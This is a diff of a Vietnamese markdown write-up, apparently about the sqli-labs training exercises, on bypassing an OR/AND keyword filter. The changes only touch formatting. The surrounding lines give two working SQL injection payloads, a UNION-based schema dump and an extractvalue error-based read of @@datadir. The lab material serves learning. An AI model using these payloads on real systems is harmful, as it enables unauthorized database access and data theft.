@@ -138,10 +138,13 @@ function blacklist($id)
 Tuy nhiên bypass cũng khá đơn giản và có nhiều cách.
 
 - Lợi dụng `replace` `OR` hoặc `AND` thành `""`
-  	Cụ thể là dùng `oorr` thay cho `or` và `aandnd` thay cho `and`
+  	Cụ thể là dùng `oorr` thay cho `or` và `aandnd` thay cho `and`.
+  
   Payload: `?id=%27+UNION+(SELECT+1,2,GROUP_CONCAT(+SCHEMA_NAME+)+FROM+INFOORRMATION_SCHEMA.SCHEMATA)--+`
+  
 - Sử dụng `Logical Operators`
-  	Cụ thể là dùng `||` thay cho `OR` và `&&` thay cho `AND`
+  	Cụ thể là dùng `||` thay cho `OR` và `&&` thay cho `AND`.
+  
   Payload: `?id=%27+||+extractvalue(0x0a,concat(0x0a,(select+@@datadir)))--+`
 
 ## Less-25a
